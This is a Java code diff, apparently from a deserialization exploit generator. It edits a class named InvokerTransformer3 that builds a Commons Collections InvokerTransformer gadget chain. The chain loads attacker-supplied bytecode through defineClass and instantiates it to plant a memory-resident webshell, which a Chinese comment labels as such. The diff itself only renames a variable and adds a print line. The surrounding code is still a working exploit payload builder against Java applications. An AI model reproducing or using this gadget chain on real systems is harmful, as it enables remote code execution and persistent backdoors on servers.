@@ -291,20 +291,21 @@ public class InvokerTransformer3 {
          * 字节码加载
          */
         byte[] classBytes = null;
-        String javaClassName = null;
+        String className = null;
         // 内存马
         JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
 
         if (javaClassHelper != null) {
             classBytes = JavaClassBuilder.build(javaClassHelper);
-            javaClassName = javaClassHelper.getJavaClassName();
+            className = javaClassHelper.getCLASSNAME();
+            System.out.println("Class Name: " + className);
         }
 
         if (classBytes == null) {
             Printer.error("Miss classBytes");
         }
-        if (javaClassName == null) {
-            Printer.error("Miss javaClassName");
+        if (className == null) {
+            Printer.error("Miss ClassName");
         }
 
         Transformer[] transformers;
@@ -319,7 +320,7 @@ public class InvokerTransformer3 {
                     new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                     new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                     new InvokerTransformer("defineClass",
-                            new Class[]{String.class, byte[].class}, new Object[]{javaClassName, classBytes}),
+                            new Class[]{String.class, byte[].class}, new Object[]{className, classBytes}),
                     new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
                     new ConstantTransformer(1)};
         } else {
